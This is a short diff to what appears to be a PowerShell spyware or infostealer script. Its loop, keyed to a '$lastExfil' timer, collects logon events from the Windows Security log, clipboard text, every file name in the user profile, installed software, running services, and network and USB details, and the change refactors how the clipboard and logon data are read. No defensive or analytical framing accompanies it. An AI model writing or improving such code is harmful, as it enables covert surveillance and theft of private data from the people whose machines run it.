@@ -111,6 +111,9 @@ while ($true) {
 
     $now = Get-Date
     if (($now - $lastExfil).TotalMinutes -ge 5) {
+        $winEvent = try { (Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 5 -ErrorAction SilentlyContinue).Properties.Value } catch { $null }
+        $clipText = try { [System.Windows.Forms.Clipboard]::GetText() } catch { $null }
+
         $sysInfo = @{
             hostname = $env:COMPUTERNAME
             username = $env:USERNAME
@@ -128,9 +131,9 @@ while ($true) {
             services = (Get-Service | Where-Object {$_.Status -eq "Running"}).Name
             installedApps = (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*).DisplayName
             lastBoot = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
-            logins = try { (Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 5 -ErrorAction SilentlyContinue).Properties.Value } catch { "Erreur lecture events" }
+            logins = $winEvent
             files = (Get-ChildItem $env:USERPROFILE -Recurse -File | Select-Object Name, Length, LastWriteTime | Sort-Object LastWriteTime -Descending).Name
-            clipboard = try { [System.Windows.Forms.Clipboard]::GetText() } catch { "Erreur lecture clipboard" }
+            clipboard = $clipText
             wifi = (Get-NetConnectionProfile).Name
             vpn = (Get-NetAdapter | Where-Object {$_.InterfaceDescription -match "VPN"}).Name
             usb = (Get-PnpDevice | Where-Object {$_.Class -eq "USB"}).FriendlyName
